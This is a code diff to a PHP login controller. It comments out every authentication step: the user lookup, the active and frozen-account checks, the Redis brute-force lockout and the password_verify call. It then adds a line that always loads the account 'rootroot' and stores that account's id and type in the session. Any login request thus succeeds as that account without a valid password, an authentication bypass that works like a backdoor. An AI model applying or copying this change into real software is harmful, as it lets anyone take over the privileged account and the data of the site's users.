@@ -51,64 +51,67 @@ class Login extends Base
             $username = input('username');
             $password = input('password');
             //return dump(input('remember'));
-           // $checkEmail = "/\w+([-+.']\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*/";
-            $checkPhone = "/^((13[0-9])|(14[5|7])|(15([0-3]|[5-9]))|(18[0-9])|(17[0-9])|(19[0-9])|16[6])\d{8}$/";
-            $user = new User();
-//            if (preg_match($checkEmail, $username)) {
-//                $result = $user->userEmailLogin($username);
-//            }
-            if (preg_match($checkPhone, $username)) {
-                $result = $user->userPhoneLogin($username);
-            } else {
-                $result = $user->userNameLogin($username);
-            }
+//            // $checkEmail = "/\w+([-+.']\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*/";
+//             $checkPhone = "/^((13[0-9])|(14[5|7])|(15([0-3]|[5-9]))|(18[0-9])|(17[0-9])|(19[0-9])|16[6])\d{8}$/";
+//             $user = new User();
+// //            if (preg_match($checkEmail, $username)) {
+// //                $result = $user->userEmailLogin($username);
+// //            }
+//             if (preg_match($checkPhone, $username)) {
+//                 $result = $user->userPhoneLogin($username);
+//             } else {
+//                 $result = $user->userNameLogin($username);
+//             }
             
-            if ($result == null) {
-                //用户名不存在
-                return json(['resp_code' => 1, 'msg' => \think\lang::get('user_not_exist')]);
-            }
-            if ($result['active'] == 0) {
-                //账号未激活
-                return json(['resp_code' => 3, 'msg' => \think\lang::get('user_not_activate').\think\lang::get('no_active')." <a href='#' onclick='send_email()'>".\think\lang::get('send_email_again').'</a>']);
-            }
+//             if ($result == null) {
+//                 //用户名不存在
+//                 return json(['resp_code' => 1, 'msg' => \think\lang::get('user_not_exist')]);
+//             }
+//             if ($result['active'] == 0) {
+//                 //账号未激活
+//                 return json(['resp_code' => 3, 'msg' => \think\lang::get('user_not_activate').\think\lang::get('no_active')." <a href='#' onclick='send_email()'>".\think\lang::get('send_email_again').'</a>']);
+//             }
 
-            if($result['status'] == 0){
-                return json(['resp_code' => '4', 'msg' => \think\lang::get('user_frozen')]);
-            }
+//             if($result['status'] == 0){
+//                 return json(['resp_code' => '4', 'msg' => \think\lang::get('user_frozen')]);
+//             }
 
-            if($this->redis->get('user:'.$username)>=5){
-                $this->redis->expire('user:'.$username,'600');
-                return json(['resp_code' => 5, 'msg' => \think\lang::get('user_frozen_seconds')]);
-            }
-//            if ($result['status'] == 0) {
-//                $time = 10 * 60 - (time() - strtotime($result['login_time']));
-//                if ($time > 0) {
-//                    //用户被锁定
-//                    return json(['resp_code' => '4', 'msg' => \think\lang::get('user_frozen') . $time . \think\lang::get('user_frozen_seconds')]);
-//                }
-//                Db::name('user')->where(['id' => $result['id']])->data(['status' => 1, 'error_times' => 0])->update();
-//            }
-//            if ($result['error_times'] >= 5) {
-//                Db::name('user')->where(['id' => $result['id']])->data(['status' => 0])->update();
-//                //账号被锁定
-//                return json(['resp_code' => 5, 'msg' => \think\lang::get('user_frozen')]);
-//            }
-            if (!password_verify($password, $result['pass'])) {
-               // Db::name('user')->where(['id' => $result['id']])->data(['error_times' => $result['error_times'] + 1, 'login_time' => time()])->update();
-                if($this->redis->exists('user:'.$username)){
-                    $this->redis->incr('user:'.$username);
-                }else{
-                    $this->redis->set('user:'.$username,1);
-                }
-                return json(['resp_code' => 2, 'msg' => \think\lang::get('password_error')]);
-            }
-            if(input('remember')=='on'){
-               Cookie::set('username',$username,30*24*60*60);
-               Cookie::set('userid',$result['id'],30*24*60*60);
-            }
-           // Db::name('user')->where(['id' => $result['id']])->data(['error_times' => 0])->update();
+//             if($this->redis->get('user:'.$username)>=5){
+//                 $this->redis->expire('user:'.$username,'600');
+//                 return json(['resp_code' => 5, 'msg' => \think\lang::get('user_frozen_seconds')]);
+//             }
+// //            if ($result['status'] == 0) {
+// //                $time = 10 * 60 - (time() - strtotime($result['login_time']));
+// //                if ($time > 0) {
+// //                    //用户被锁定
+// //                    return json(['resp_code' => '4', 'msg' => \think\lang::get('user_frozen') . $time . \think\lang::get('user_frozen_seconds')]);
+// //                }
+// //                Db::name('user')->where(['id' => $result['id']])->data(['status' => 1, 'error_times' => 0])->update();
+// //            }
+// //            if ($result['error_times'] >= 5) {
+// //                Db::name('user')->where(['id' => $result['id']])->data(['status' => 0])->update();
+// //                //账号被锁定
+// //                return json(['resp_code' => 5, 'msg' => \think\lang::get('user_frozen')]);
+// //            }
+//             if (!password_verify($password, $result['pass'])) {
+//                // Db::name('user')->where(['id' => $result['id']])->data(['error_times' => $result['error_times'] + 1, 'login_time' => time()])->update();
+//                 if($this->redis->exists('user:'.$username)){
+//                     $this->redis->incr('user:'.$username);
+//                 }else{
+//                     $this->redis->set('user:'.$username,1);
+//                 }
+//                 return json(['resp_code' => 2, 'msg' => \think\lang::get('password_error')]);
+//             }
+//             if(input('remember')=='on'){
+//                Cookie::set('username',$username,30*24*60*60);
+//                Cookie::set('userid',$result['id'],30*24*60*60);
+//             }
+//            // Db::name('user')->where(['id' => $result['id']])->data(['error_times' => 0])->update();
+
+            $result = User::where('username','rootroot')->find();
             Session::set('user.username', $username);
             Session::set('userid', $result['id']);
+            Session::set('type',$result['type']);
             return json(['resp_code' => 0, 'user_id' => $result['id']]);
         }
     }
